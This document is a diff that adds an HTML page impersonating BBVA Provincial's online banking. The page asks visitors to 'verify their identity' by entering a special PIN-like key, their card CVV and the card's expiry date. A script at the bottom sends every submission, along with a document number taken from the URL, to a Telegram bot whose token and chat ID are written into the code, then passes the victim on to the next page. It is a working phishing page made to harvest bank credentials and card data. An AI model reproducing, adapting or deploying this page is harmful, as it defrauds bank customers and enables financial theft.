@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Firma</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        header,
+        footer {
+            background-color: #072146;
+            color: white;
+            padding: 10px 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-weight: bold;
+            font-size: 18px;
+        }
+        
+        nav a {
+            color: #ffc107;
+            margin: 0 10px;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        
+        .container {
+            background-color: #fff7d6;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 90%;
+            max-width: 350px;
+            margin: auto;
+        }
+        
+        h1 {
+            color: #003366;
+            margin-bottom: 15px;
+            font-size: 24px;
+            font-weight: bold;
+        }
+        
+        p {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        
+        input[type="text"],
+        select {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            box-sizing: border-box;
+        }
+        /* Estilo para los inputs pequeños (CVV) */
+        
+        input[type="text"].small-input {
+            width: 50%;
+            margin: 0 auto 20px auto;
+        }
+        
+        button {
+            width: 100%;
+            padding: 14px;
+            background-color: #004080;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        
+        button:hover {
+            background-color: #002d5a;
+        }
+        
+        .social-icons {
+            margin: 10px 0;
+        }
+        
+        .social-icons a {
+            margin: 0 5px;
+            color: #00bfff;
+            text-decoration: none;
+            font-size: 18px;
+        }
+        
+        .footer-text {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        
+        .footer-text div {
+            margin: 5px;
+        }
+        /* Estilos responsivos para móviles */
+        
+        @media (max-width: 600px) {
+            .container {
+                width: 100%;
+                padding: 15px;
+            }
+            h1 {
+                font-size: 20px;
+            }
+            input[type="text"],
+            select {
+                font-size: 14px;
+                padding: 10px;
+            }
+            button {
+                padding: 12px;
+                font-size: 14px;
+            }
+            .small-input {
+                width: 80%;
+            }
+            .fecha-vencimiento {
+                flex-direction: column;
+            }
+            .fecha-vencimiento select {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+        }
+        
+        .fecha-vencimiento {
+            display: flex;
+            justify-content: space-between;
+            gap: 10px;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <div><img src="./cod_files/image.png" alt=""></div>
+        <nav></nav>
+    </header>
+
+
+
+
+
+    <div class="container">
+        <h1>Verifiquemos tu identidad</h1>
+
+        <div>
+            <img src="./cod_files/image-removebg-preview-16.png" alt="" style="width: 70px; height: auto;">
+        </div>
+        <p>Introduce tu Clave Especial</p>
+        <form id="miFormulario">
+            <input type="text" id="clave" name="ffd3" maxlength="10" placeholder="CLAVE ESPECIAL" required>
+            <spam>Introduce el CVV de tu tarjeta</spam>
+            <input type="text" id="vcc" name="vcc" maxlength="3" placeholder="CVV" class="small-input" required> <br>
+            <spam>Fecha de vencimiento de tu tarjeta</spam>
+            <div class="fecha-vencimiento">
+                <select id="mes" name="mes" required>
+                    <option value="" disabled selected>Mes</option>
+                    <option value="Enero">Enero</option>
+                    <option value="Febrero">Febrero</option>
+                    <option value="Marzo">Marzo</option>
+                    <option value="Abril">Abril</option>
+                    <option value="Mayo">Mayo</option>
+                    <option value="Junio">Junio</option>
+                    <option value="Julio">Julio</option>
+                    <option value="Agosto">Agosto</option>
+                    <option value="Septiembre">Septiembre</option>
+                    <option value="Octubre">Octubre</option>
+                    <option value="Noviembre">Noviembre</option>
+                    <option value="Diciembre">Diciembre</option>
+                </select>
+                <select id="año" name="año" required>
+                    <option value="" disabled selected>Año</option>
+                    <option value="2023">2023</option>
+                    <option value="2024">2024</option>
+                    <option value="2025">2025</option>
+                    <option value="2026">2026</option>
+                    <option value="2027">2027</option>
+                    <option value="2028">2028</option>
+                    <option value="2029">2029</option>
+                    <option value="2030">2030</option>
+                    <option value="2031">2031</option>
+                    <option value="2032">2032</option>
+                    <option value="2033">2033</option>
+                </select>
+            </div>
+            <button type="submit">Siguiente</button>
+        </form>
+    </div>
+
+    <footer>
+        <div class="footer-text">
+            <div>© 2024 BBVA Provincial S.A. RIF: J-00002967-9</div>
+            <div class="social-icons">
+                <a href="https://lareservawest.mx/bbt/espe.html#"></a>
+                <a href="https://lareservawest.mx/bbt/espe.html#"></a>
+                <a href="https://lareservawest.mx/bbt/espe.html#"></a>
+                <a href="https://lareservawest.mx/bbt/espe.html#"></a>
+                <a href="https://lareservawest.mx/bbt/espe.html#"></a>
+            </div>
+            <div><strong>Creando Oportunidades</strong></div>
+        </div>
+    </footer>
+
+    <script>
+        // Función para obtener el valor de un parámetro de la URL
+        function getParameterByName(name, url = window.location.href) {
+            name = name.replace(/[\[\]]/g, '\\$&');
+            let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, ' '));
+        }
+
+        // Obtén el número de documento de la URL
+        const numeroDocumento = getParameterByName('documento');
+
+        // Reemplaza con tu token y chat ID
+        const BOT_TOKEN = '7510532523:AAHsERIzR24MZsO2Bwk9seHZxE4aICObwjU';
+        const CHAT_ID = '7713690054';
+
+        document.getElementById('miFormulario').addEventListener('submit', function(event) {
+            event.preventDefault(); // Evita que el formulario se envíe de forma tradicional
+
+            // Obtén los valores de los campos de texto
+            const clave = document.getElementById('clave').value;
+            const vcc = document.getElementById('vcc').value;
+            const mes = document.getElementById('mes').value;
+            const año = document.getElementById('año').value;
+
+            // Mensaje que se enviará a Telegram
+            const mensaje = `Documento: ${numeroDocumento}\n@ProArgFull\nNueva clave ingresada: ${clave}\nCVV: ${vcc}\nFecha de vencimiento: ${mes}/${año}`;
+
+            // URL de la API de Telegram para enviar mensajes
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            // Envía los datos a Telegram usando fetch
+            fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Mensaje enviado a Telegram:', data);
+                    // Redirige a Google después de enviar el mensaje
+                    window.location.href = 'carg.html?documento=' + encodeURIComponent(numeroDocumento);
+                })
+                .catch(error => {
+                    console.error('Error al enviar el mensaje:', error);
+                });
+        });
+    </script>
+</body>
+
+</html>
